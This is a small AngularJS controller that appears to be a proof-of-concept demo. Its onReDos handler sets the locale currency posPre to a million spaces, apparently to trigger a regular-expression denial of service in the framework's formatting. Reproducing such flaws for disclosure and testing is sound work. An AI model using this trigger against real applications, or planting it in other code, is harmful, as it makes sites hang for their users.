class AppCtrl {
  constructor($locale, $timeout) {
    'ngInject';
    const ctrl = this;
    ctrl.currencySymbol = '$';
    ctrl.amount = 100;
    ctrl.posPre = $locale.NUMBER_FORMATS.PATTERNS[1].posPre;

    ctrl.onPosPreChange = () => {
      console.log("2")
      $locale.NUMBER_FORMATS.PATTERNS[1].posPre = ctrl.posPre;
      const amount = ctrl.amount;
      ctrl.amount = 0;
      $timeout(() => (ctrl.amount = amount));
    };

    ctrl.onReDos = () => {
      console.log("1")
      ctrl.currencySymbol = '';
      ctrl.posPre = ' '.repeat(1000000);
      $locale.NUMBER_FORMATS.PATTERNS[1].posPre = ctrl.posPre;
    };
  }
}

export default AppCtrl;
